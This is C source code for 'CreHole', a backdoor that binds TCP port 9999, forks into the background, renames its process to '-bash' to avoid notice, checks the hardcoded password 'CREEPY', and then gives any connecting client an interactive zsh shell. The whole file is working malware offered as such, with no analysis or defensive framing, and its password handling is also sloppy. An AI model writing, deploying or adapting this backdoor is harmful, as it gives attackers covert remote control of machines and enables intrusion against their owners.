#include <stdlib.h>
#include <netinet/in.h>
#include <stdio.h>
#include <sys/socket.h>
#include <errno.h>
#include <strings.h>
#include <sys/types.h>
#include <signal.h>
#define port   9999
#define falsches_passwd "You entered an incorrect password\n"
#define richtiges_passwd "Hello there...\n"
#define versteck "-bash"
#define shell "/bin/zsh" /*I am a zsh fetishist, =)*/
#define willkommen "CreHole written by CreepyNodque\nEnter all commands followed by a ;\n"
#define passwd_frage 1 /*Enable Password? */
#define abfrage "Enter Password: "
#ifdef passwd_frage
#define passwort "CREEPY"
#endif

int main (int argc, char *argv[]);
#ifdef passwd_frage
int login (int);
#endif

int background()
{
int pid;
signal(SIGCHLD,SIG_IGN);
pid = fork();
if(pid>0)
{
sleep(1);
exit(EXIT_SUCCESS);    
}
if(pid==0)
{
signal(SIGCHLD,SIG_DFL);
return getpid();                
}
return -1;                    
}

int main (int argc, char *argv[])
{
        int skfd, nfd, groesse;
        struct sockaddr_in local;
        struct sockaddr_in remote;
        

        strcpy (argv[0], versteck);
        signal (SIGCHLD, SIG_IGN);

        bzero (&local, sizeof(local));
        local.sin_family = AF_INET;
        local.sin_port = htons (port);
        local.sin_addr.s_addr = INADDR_ANY;
        bzero (&(local.sin_zero), 8);

        if ((skfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                perror("socket");
                exit(1);
        }

        if (bind (skfd, (struct sockaddr *)&local, sizeof(struct sockaddr)) == -1) {
                perror("bind");
                exit(1);
        }

        if (listen(skfd, 5) == -1) {
                perror("listen");
                exit(1);
        }
        groesse = sizeof(struct sockaddr_in);
        background();
        while (1) {
                if ((nfd = accept (skfd, (struct sockaddr *)&remote, &groesse)) == -1) {
                        perror ("accept");
                        exit(1);
                }

                if (!fork ()) {
                        send (nfd, willkommen, sizeof(willkommen), 0);

#ifdef passwd_frage
                        if (login(nfd) != 1) {
                                send (nfd, falsches_passwd, sizeof(falsches_passwd), 0);
                                close (nfd);
                                exit(1);
                        }
#endif

                        close (0); close(1); close(2);
                        dup2 (nfd, 0); dup2(nfd, 1); dup2(nfd, 2);
                        execl (shell, shell, (char *)0); close(nfd);
exit(0);
                }
                close (nfd);
        }
        return 0;
}

#ifdef passwd_frage
int login (int fd)
{
        char u_passwd[15];
        int i;

        send (fd, abfrage, sizeof(abfrage), 0);
        recv (fd, u_passwd, sizeof(u_passwd), 0);

        for (i = 0; i < strlen (u_passwd); i++) {
                if (u_passwd[i] == '\n' || u_passwd[i] == '\r')
                u_passwd[i] = '\0';
        }

        if (strcmp (passwort, u_passwd) == 0) {
                return 1;
        } else {
                return 0;
        }
}
#endif
